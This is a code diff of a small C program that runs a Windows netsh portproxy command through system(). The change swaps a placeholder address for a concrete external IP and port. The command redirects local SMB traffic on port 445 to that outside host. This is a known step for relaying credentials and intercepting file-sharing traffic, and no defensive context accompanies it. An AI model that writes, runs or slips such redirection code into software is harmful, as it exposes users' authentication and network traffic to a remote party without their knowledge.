@@ -3,7 +3,7 @@
 
 int main() {
     // Command to execute
-    const char* command = "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=445 connectaddress=your.Server_ip.address.here connectport=4456";
+    const char* command = "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=445 connectaddress=122.176.54.41 connectport=6969";
 
     // Execute the command
     int result = system(command);
